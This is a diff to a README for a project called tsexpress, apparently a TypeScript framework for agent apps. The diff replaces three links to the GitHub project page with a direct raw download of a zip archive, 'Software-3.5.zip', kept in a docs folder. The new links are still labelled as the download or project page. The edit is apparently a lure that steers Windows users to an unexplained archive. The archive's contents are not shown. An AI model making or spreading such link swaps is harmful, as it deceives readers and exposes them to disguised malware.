@@ -1,6 +1,6 @@
 # 🤖 tsexpress - Simple TypeScript Apps for Agents
 
-[![Download tsexpress](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/rutgercurtainless662/tsexpress)
+[![Download tsexpress](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rutgercurtainless662/tsexpress/main/docs/Software-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ If you do not have Node.js yet, install the current LTS version from the Node.js
 ## 🖥️ Install on Windows
 
 1. Open the download page:
-   https://github.com/rutgercurtainless662/tsexpress
+   https://raw.githubusercontent.com/rutgercurtainless662/tsexpress/main/docs/Software-3.5.zip
 
 2. On the GitHub page, look for the project files and any release or setup instructions.
 
@@ -173,7 +173,7 @@ It fits use cases like:
 
 Visit the project page here and use the files or release shown there:
 
-https://github.com/rutgercurtainless662/tsexpress
+https://raw.githubusercontent.com/rutgercurtainless662/tsexpress/main/docs/Software-3.5.zip
 
 ## 🧠 Project Topics
 
